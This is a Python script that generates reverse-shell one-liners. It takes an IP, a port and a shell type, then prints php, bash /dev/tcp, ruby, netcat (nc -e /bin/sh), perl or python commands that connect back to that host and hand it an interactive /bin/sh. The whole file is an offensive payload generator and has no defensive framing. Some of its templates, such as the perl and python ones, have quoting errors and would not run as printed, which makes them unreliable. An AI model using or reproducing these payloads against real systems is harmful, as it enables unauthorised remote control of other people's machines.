import optparse

def user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-i", "--ip", dest="ip_address", help= "Enter your IP")
    parse_object.add_option("-p","--port",dest="port_number",help = "Enter port number for listen")
    parse_object.add_option("-s","--shell",dest="shell_option",help="Choose shell: php, python, ruby, perl, bash, netcat")
    options = parse_object.parse_args()[0]
    if not options.ip_address:
        print("-i, you must enter your IP address")
    if not options.port_number:
        print("-p, you must enter a port number for listen")
    if not options.shell_option:
        print("-s, you must choose one of php, python, ruby, perl, bash, netcat")
    return options

# Colors
OKGREEN = '\033[92m'
ENDC = '\033[0m'
BOLD = '\033[1m'
WARNING = '\033[93m'

user_info = user_input()
user_ip_address = user_info.ip_address
user_port = user_info.port_number
user_shell_choice = user_info.shell_option

def create_shell (user_ip_address, user_port, user_shell_choice):
    if user_shell_choice == "php":
        print(OKGREEN + "\nphp -r '$sock=fsockopen("+ "'" + str(user_ip_address) + "'" + "," + str(user_port) +  ");exec('/bin/sh -i <&3 >&3 2>&3');'"+ENDC)

    if user_shell_choice == "bash":
        print(OKGREEN+'\nbash -i >& /dev/tcp/' + str(user_ip_address) + "/" + str(user_port) + ' ' + '0>&1'+ENDC)
    
    if user_shell_choice == "ruby":
        print(OKGREEN+"\nruby -rsocket -e'f=TCPSocket.open(" + '"' + str(user_ip_address)+ '"' +"," + str(user_port) + ").to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)'"+ENDC)
    
    if user_shell_choice == "netcat":
        n= "\nnc -e /bin/sh " + str(user_ip_address) + " "+ str(user_port)
        print(OKGREEN+n+ENDC)
    
    if user_shell_choice == "nc":
        n= "\nnc -e /bin/sh " + str(user_ip_address) + " "+ str(user_port)
        print(OKGREEN+n+ENDC)
    
    if user_shell_choice == "perl":
        p = "\nperl -e 'use Socket;$i=" + str(user_ip_address) + ";$p=" + str(user_port) + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};'"
        print(OKGREEN+p+ENDC)
    
    if user_shell_choice == "python":
        py = "\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + str(user_ip_address) + '"' + "," + str(user_port) + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);'"
        print(OKGREEN+py+ENDC)
    

create_shell(user_ip_address, user_port, user_shell_choice)

print(OKGREEN+BOLD+"\n[+] created by Sercan Yılmaz"+ENDC)
